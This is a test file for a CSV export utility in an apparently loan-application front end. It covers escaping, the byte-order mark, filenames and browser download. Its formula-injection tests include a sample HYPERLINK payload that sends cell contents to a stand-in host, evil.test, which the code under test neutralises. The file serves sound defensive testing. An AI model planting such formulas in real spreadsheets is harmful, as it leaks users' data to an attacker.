import { csvDate, downloadCsv, exportCsv, stampedFilename, toCsv } from './csv-export.util';

describe('toCsv', () => {
  it('separates cells with commas and rows with CRLF, the RFC 4180 line ending Excel expects', () => {
    expect(
      toCsv([
        ['a', 'b'],
        ['c', 'd'],
      ]),
    ).toBe('a,b\r\nc,d');
  });

  it('writes null and undefined as an empty cell, not as the words null and undefined', () => {
    expect(toCsv([[null, undefined]])).toBe(',');
  });

  it('keeps zero and false, which are values a reader needs rather than blanks', () => {
    expect(toCsv([[0, false]])).toBe('0,false');
  });

  it('quotes a cell holding a comma, so one value does not become two columns', () => {
    expect(toCsv([['Jakarta, Indonesia']])).toBe('"Jakarta, Indonesia"');
  });

  it('doubles an embedded quote and wraps the cell', () => {
    expect(toCsv([['He said "no"']])).toBe('"He said ""no"""');
  });

  it('quotes a cell holding a newline, so one row does not become two', () => {
    expect(toCsv([['line one\nline two']])).toBe('"line one\nline two"');
  });

  it('leaves an ordinary cell unquoted', () => {
    expect(toCsv([['APP-0001']])).toBe('APP-0001');
  });

  it('emits nothing for no rows', () => {
    expect(toCsv([])).toBe('');
  });
});

describe('toCsv formula injection', () => {
  const opener = (text: string) => toCsv([[text]]);

  it('defuses a cell starting with = so the spreadsheet does not execute it', () => {
    expect(opener('=1+1')).toBe('"\t=1+1"');
  });

  it('defuses the other three spreadsheet formula starters', () => {
    expect(opener('+1')).toBe('"\t+1"');
    expect(opener('-1')).toBe('"\t-1"');
    expect(opener('@SUM(A1)')).toBe('"\t@SUM(A1)"');
  });

  it('defuses the classic exfiltration payload a customer could type into a loan purpose', () => {
    expect(opener('=HYPERLINK("http://evil.test?x="&A1,"click")')).toContain('\t=HYPERLINK');
  });

  it('defuses leading whitespace tricks that would otherwise slip past a naive check', () => {
    expect(opener('\t=1+1')).toBe('"\t\t=1+1"');
    expect(opener('\r=1+1')).toBe('"\t\r=1+1"');
  });

  it('leaves a negative number alone, because a number is not a formula', () => {
    expect(toCsv([[-5000]])).toBe('-5000');
  });

  it('does defuse a negative number that arrived as a string, which is the safe side to err on', () => {
    expect(opener('-5000')).toBe('"\t-5000"');
  });

  it('leaves an equals sign alone when it is not the first character', () => {
    expect(opener('total=5')).toBe('total=5');
  });
});

describe('stampedFilename', () => {
  beforeEach(() => {
    vi.useFakeTimers();
    vi.setSystemTime(new Date(2026, 8, 15, 9, 7));
  });

  afterEach(() => vi.useRealTimers());

  it('stamps the local date and time so two exports never overwrite each other', () => {
    expect(stampedFilename('applications')).toBe('applications-2026-09-15_0907.csv');
  });

  it('pads single digit months, days, hours and minutes so the name sorts chronologically', () => {
    vi.setSystemTime(new Date(2026, 0, 2, 3, 4));
    expect(stampedFilename('dashboard')).toBe('dashboard-2026-01-02_0304.csv');
  });

  it('accepts a different extension', () => {
    expect(stampedFilename('applications', 'xlsx')).toBe('applications-2026-09-15_0907.xlsx');
  });
});

describe('csvDate', () => {
  it('keeps only the date half of an ISO timestamp', () => {
    expect(csvDate('2026-09-15T04:31:22.881Z')).toBe('2026-09-15');
  });

  it('passes a plain date through untouched', () => {
    expect(csvDate('2026-09-15')).toBe('2026-09-15');
  });

  it('gives an empty cell for a missing date instead of the string null', () => {
    expect(csvDate(null)).toBe('');
    expect(csvDate(undefined)).toBe('');
    expect(csvDate('')).toBe('');
  });
});

describe('downloadCsv', () => {
  let created: Blob[];
  let revoked: string[];
  let clicked: HTMLAnchorElement[];
  let realCreateElement: typeof document.createElement;

  beforeEach(() => {
    created = [];
    revoked = [];
    clicked = [];

    URL.createObjectURL = vi.fn((blob: Blob) => {
      created.push(blob);
      return 'blob:stub';
    }) as unknown as typeof URL.createObjectURL;

    URL.revokeObjectURL = vi.fn((url: string) => {
      revoked.push(url);
    }) as unknown as typeof URL.revokeObjectURL;

    realCreateElement = document.createElement.bind(document);
    document.createElement = ((tag: string) => {
      const el = realCreateElement(tag);
      if (tag === 'a') {
        (el as HTMLAnchorElement).click = () => clicked.push(el as HTMLAnchorElement);
      }
      return el;
    }) as typeof document.createElement;
  });

  afterEach(() => {
    document.createElement = realCreateElement;
  });

  it('prefixes a UTF-8 BOM, or Excel renders Indonesian names as mojibake', async () => {
    downloadCsv('x.csv', 'nama\nSiti Nurhaliza');

    expect(created).toHaveLength(1);

    const bytes = new Uint8Array(await created[0].arrayBuffer());
    expect([...bytes.slice(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);
  });

  it('writes the rows after the BOM and nothing else', async () => {
    downloadCsv('x.csv', 'nama\nSiti Nurhaliza');
    expect(await created[0].text()).toBe('nama\nSiti Nurhaliza');
  });

  it('declares the charset on the blob type as well as in the BOM', () => {
    downloadCsv('x.csv', 'a');
    expect(created[0].type).toBe('text/csv;charset=utf-8;');
  });

  it('leaves no anchor behind in the document', () => {
    downloadCsv('x.csv', 'a');
    expect(document.querySelectorAll('a')).toHaveLength(0);
  });

  it('releases the object URL rather than leaking it for the life of the tab', () => {
    vi.useFakeTimers();
    downloadCsv('x.csv', 'a');

    expect(revoked).toEqual([]);
    vi.runAllTimers();
    expect(revoked).toEqual(['blob:stub']);

    vi.useRealTimers();
  });

  it('names the file what the caller asked for', () => {
    downloadCsv('applications-2026-09-15.csv', 'a');

    expect(clicked).toHaveLength(1);
    expect(clicked[0].download).toBe('applications-2026-09-15.csv');
  });

  it('points the link at the blob it just made', () => {
    downloadCsv('x.csv', 'a');
    expect(clicked[0].getAttribute('href')).toBe('blob:stub');
  });
});

describe('exportCsv', () => {
  let created: Blob[];
  let realCreateElement: typeof document.createElement;

  beforeEach(() => {
    created = [];

    URL.createObjectURL = vi.fn((blob: Blob) => {
      created.push(blob);
      return 'blob:stub';
    }) as unknown as typeof URL.createObjectURL;
    URL.revokeObjectURL = vi.fn() as unknown as typeof URL.revokeObjectURL;

    realCreateElement = document.createElement.bind(document);
    document.createElement = ((tag: string) => {
      const el = realCreateElement(tag);
      if (tag === 'a') (el as HTMLAnchorElement).click = () => undefined;
      return el;
    }) as typeof document.createElement;
  });

  afterEach(() => {
    document.createElement = realCreateElement;
  });

  it('serialises the rows and hands the same bytes to the download, injection guard included', async () => {
    exportCsv('x.csv', [
      ['id', 'purpose'],
      ['APP-1', '=cmd'],
    ]);

    expect(await created[0].text()).toBe('id,purpose\r\nAPP-1,"\t=cmd"');
  });

  it('still writes the BOM when going through exportCsv', async () => {
    exportCsv('x.csv', [['id']]);

    const bytes = new Uint8Array(await created[0].arrayBuffer());
    expect([...bytes.slice(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);
  });

  it('exports a file holding only the BOM for no rows, rather than throwing', async () => {
    exportCsv('x.csv', []);

    expect(await created[0].text()).toBe('');
    expect(created[0].size).toBe(3);
  });
});
